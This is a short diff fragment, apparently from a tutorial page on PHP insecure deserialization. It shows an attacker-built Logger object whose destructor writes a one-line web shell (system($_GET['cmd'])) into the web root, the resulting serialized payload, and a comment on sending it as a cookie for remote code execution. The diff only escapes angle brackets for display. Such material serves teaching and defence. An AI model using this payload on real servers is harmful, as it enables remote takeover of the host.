@@ -103,10 +103,10 @@ class Logger {
 // Attacker crafts payload:
 $evil = new Logger();
 $evil->logfile = '/var/www/html/shell.php';
-$evil->data = '<?php system($_GET["cmd"]); ?>';
+$evil->data = '&lt;?php system($_GET["cmd"]); ?&gt;';
 
 echo serialize($evil);
-// O:6:"Logger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
+// O:6:"Logger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:4:"data";s:30:"&lt;?php system($_GET["cmd"]); ?&gt;";}
 
 // Send as cookie: ?data=[base64 of payload]
 // On script end → __destruct() writes PHP shell → RCE</code></pre>
